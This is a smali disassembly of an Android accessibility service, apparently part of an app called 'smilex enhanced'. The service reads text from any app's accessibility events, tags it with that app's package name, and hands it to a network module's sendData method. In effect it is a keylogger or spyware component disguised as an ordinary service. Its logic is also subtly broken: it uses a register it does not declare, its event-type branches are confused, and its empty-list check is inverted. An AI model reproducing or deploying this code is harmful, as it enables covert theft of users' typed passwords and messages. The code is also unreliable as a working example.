.class public Lcom/smilex/enhanced/services/AccessibilityMonitorService;
.super Landroid/accessibilityservice/AccessibilityService;
.source "AccessibilityMonitorService.java"

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Landroid/accessibilityservice/AccessibilityService;-><init>()V
    return-void
.end method

.method public onAccessibilityEvent(Landroid/view/accessibility/AccessibilityEvent;)V
    .registers 6
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getEventType()I
    move-result v0
    # TYPE_VIEW_TEXT_CHANGED = 16, TYPE_WINDOW_CONTENT_CHANGED = 2048
    const/16 v1, 0x10
    if-eq v0, v1, :check_window
    goto :process_text
    :check_window
    const/16 v1, 0x800
    if-eq v0, v1, :return_void
    :process_text
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getText()Ljava/util/List;
    move-result-object v1
    if-eqz v1, :empty_list
    invoke-interface {v1}, Ljava/util/List;->isEmpty()Z
    move-result v2
    if-eqz v2, :empty_list
    invoke-virtual {v1}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v2
    invoke-virtual {p1}, Landroid/view/accessibility/AccessibilityEvent;->getPackageName()Ljava/lang/CharSequence;
    move-result-object v3
    invoke-virtual {v3}, Ljava/lang/Object;->toString()Ljava/lang/String;
    move-result-object v3
    const-string v4, "accessibility"
    new-instance v5, Ljava/lang/StringBuilder;
    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V
    const-string v6, "["
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v6, "] "
    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v5
    invoke-static {v4, v5}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V
    :empty_list
    :return_void
    return-void
.end method

.method public onInterrupt()V
    .registers 1
    return-void
.end method
